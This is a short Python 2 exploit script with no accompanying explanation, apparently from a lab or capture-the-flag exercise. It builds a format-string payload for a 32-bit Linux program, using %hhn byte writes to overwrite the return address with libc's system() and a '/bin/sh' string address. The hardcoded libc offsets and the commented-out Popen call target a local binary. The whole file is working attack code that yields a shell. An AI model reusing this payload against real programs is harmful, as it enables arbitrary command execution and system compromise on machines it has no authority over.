import sys
import struct
from subprocess import Popen

addr_buf = int(sys.argv[1], 16)
offset_retaddr = int(sys.argv[2], 16)
libc_base = int(sys.argv[3], 16)
index = int(sys.argv[4])

offset_system = 0x0003af60  # nm -D /lib/i386-linux-gnu/libc.so.6 | grep system
offset_binsh = 0x156804    # strings -tx /lib/i386-linux-gnu/libc.so.6 | grep '/bin/sh'

addr_retaddr = addr_buf + offset_retaddr

buf = struct.pack('<I', addr_retaddr)
buf += struct.pack('<I', addr_retaddr+1)
buf += struct.pack('<I', addr_retaddr+2)
buf += struct.pack('<I', addr_retaddr+3)
buf += struct.pack('<I', addr_retaddr+8)
buf += struct.pack('<I', addr_retaddr+9)
buf += struct.pack('<I', addr_retaddr+10)
buf += struct.pack('<I', addr_retaddr+11)

b = map(ord, struct.pack('<I', libc_base + offset_binsh))
a = map(ord, struct.pack('<I', libc_base + offset_system))
b[3] = ((b[3]-b[2]-1) % 0x100) + 1
b[2] = ((b[2]-b[1]-1) % 0x100) + 1
b[1] = ((b[1]-b[0]-1) % 0x100) + 1
b[0] = ((b[0]-a[3]-1) % 0x100) + 1
a[3] = ((a[3]-a[2]-1) % 0x100) + 1
a[2] = ((a[2]-a[1]-1) % 0x100) + 1
a[1] = ((a[1]-a[0]-1) % 0x100) + 1
a[0] = ((a[0]-len(buf)-1) % 0x100) + 1

buf += "%%%dc%%%d$hhn" % (a[0], index)
buf += "%%%dc%%%d$hhn" % (a[1], index+1)
buf += "%%%dc%%%d$hhn" % (a[2], index+2)
buf += "%%%dc%%%d$hhn" % (a[3], index+3)
buf += "%%%dc%%%d$hhn" % (b[0], index+4)
buf += "%%%dc%%%d$hhn" % (b[1], index+5)
buf += "%%%dc%%%d$hhn" % (b[2], index+6)
buf += "%%%dc%%%d$hhn" % (b[3], index+7)

print (buf)
#with open('buf', 'wb') as f:
#    f.write(buf)

#p = Popen(['./a.out', buf])
#p.wait()
